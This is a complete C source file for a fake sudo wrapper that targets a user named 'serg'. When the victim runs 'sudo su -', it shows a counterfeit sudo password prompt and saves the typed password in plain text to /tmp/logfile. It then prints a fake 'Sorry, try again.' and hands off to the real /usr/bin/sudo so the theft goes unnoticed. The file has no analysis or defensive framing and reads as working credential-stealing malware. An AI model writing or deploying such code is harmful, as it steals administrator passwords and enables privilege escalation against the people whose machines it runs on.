#include <termios.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <signal.h>

void fork_exec(char* argv[]) {
	execv("/usr/bin/sudo", argv);
}

int main(int argc, char* argv[]) {

	int id = getuid();
	if (id == 0) {
		fork_exec(argv);
		return 0;
	}

	if (argc > 3) {
		fork_exec(argv);
		return 0;
	}

	if (argc < 3) {
		fork_exec(argv);
		return 0;
	}
	if (argc == 3) {
		char *arg = argv[1];
		int len = strlen(arg);
		if (len != 2) {
			fork_exec(argv);
			return 0;
		} else {
			char s = 's';
			char u = 'u';
			if (arg[0] != s) {
				fork_exec(argv);
				return 0;
			}
			if (arg[1] != u) {
				fork_exec(argv);
				return 0;
			}
		}
		arg = argv[2];
		len = strlen(arg);
		if (len != 1) {
			fork_exec(argv);
			return 0;
		} else {
			char a = '-';
			if (arg[0] != a) {
				fork_exec(argv);
				return 0;
			}
		}
	}

	FILE* file = fopen("/tmp/logfile", "r");

	if (file != NULL) {
		fork_exec(argv);
		return 0;
	} else {
		file = fopen("/tmp/logfile", "a+");

		if (file == NULL) {
			fork_exec(argv);
			return 0;
		}

	}

	char *password = getpass("[sudo] password for serg: ");
	size_t writed_bytes = fwrite(password, sizeof(char), strlen(password),
			file);
	fflush(file);
	fclose(file);
	sleep(2);
	printf("Sorry, try again.\n");
	fork_exec(argv);
	return 0;
}
